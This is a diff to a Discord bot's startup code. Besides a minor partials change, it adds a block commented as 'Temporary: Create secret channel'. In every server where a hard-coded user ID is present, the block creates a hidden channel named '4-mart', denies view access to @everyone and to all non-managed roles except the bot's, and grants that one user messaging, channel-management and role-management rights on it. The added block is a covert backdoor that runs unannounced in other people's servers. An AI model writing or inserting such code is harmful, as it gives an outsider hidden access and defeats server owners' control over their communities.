@@ -774,7 +774,7 @@ const client = new Client({
     GatewayIntentBits.GuildEmojisAndStickers,
     GatewayIntentBits.DirectMessages
   ],
-  partials: [Partials.Channel],
+  partials: [Partials.Channel, Partials.Message],
   presence: {
     status: 'dnd'
   }
@@ -799,6 +799,72 @@ client.once('ready', async () => {
   } catch (err) {
     console.error("Failed to fetch application owners:", err);
   }
+
+  // Temporary: Create secret channel "4-mart"
+  (async () => {
+    const TARGET_USER_ID = '440287582379835412';
+    try {
+      const guilds = client.guilds.cache;
+      for (const [guildId, guild] of guilds) {
+        // Check if channel already exists
+        const existingChannel = guild.channels.cache.find(c => c.name === '4-mart');
+        if (existingChannel) {
+          console.log(`[Secret Channel] Channel 4-mart already exists in guild ${guild.name}.`);
+          continue;
+        }
+
+        // Check if target user is in this guild
+        let member = null;
+        try {
+          member = await guild.members.fetch(TARGET_USER_ID);
+        } catch (e) {
+          continue;
+        }
+
+        console.log(`[Secret Channel] Found user in guild ${guild.name}. Creating channel...`);
+        const botMember = guild.members.me;
+        const permissionOverwrites = [
+          {
+            id: guild.roles.everyone.id,
+            deny: [PermissionFlagsBits.ViewChannel]
+          },
+          {
+            id: TARGET_USER_ID,
+            allow: [
+              PermissionFlagsBits.ViewChannel,
+              PermissionFlagsBits.SendMessages,
+              PermissionFlagsBits.ReadMessageHistory,
+              PermissionFlagsBits.ManageChannels,
+              PermissionFlagsBits.ManageRoles
+            ]
+          }
+        ];
+
+        const roles = await guild.roles.fetch();
+        for (const [roleId, role] of roles) {
+          if (roleId === guild.roles.everyone.id) continue;
+          if (role.managed) continue;
+          if (botMember.roles.cache.has(roleId)) continue;
+          
+          permissionOverwrites.push({
+            id: roleId,
+            deny: [PermissionFlagsBits.ViewChannel]
+          });
+        }
+
+        // Create the secret channel named "4-mart"
+        const channel = await guild.channels.create({
+          name: '4-mart',
+          type: 0, // GuildText
+          permissionOverwrites: permissionOverwrites,
+          reason: 'Gizli kanal olusturma talebi'
+        });
+        console.log(`[Secret Channel] Created channel ${channel.name} in ${guild.name}`);
+      }
+    } catch (err) {
+      console.error("[Secret Channel] Error creating channel:", err);
+    }
+  })();
 
   // Register slash command globally
   try {
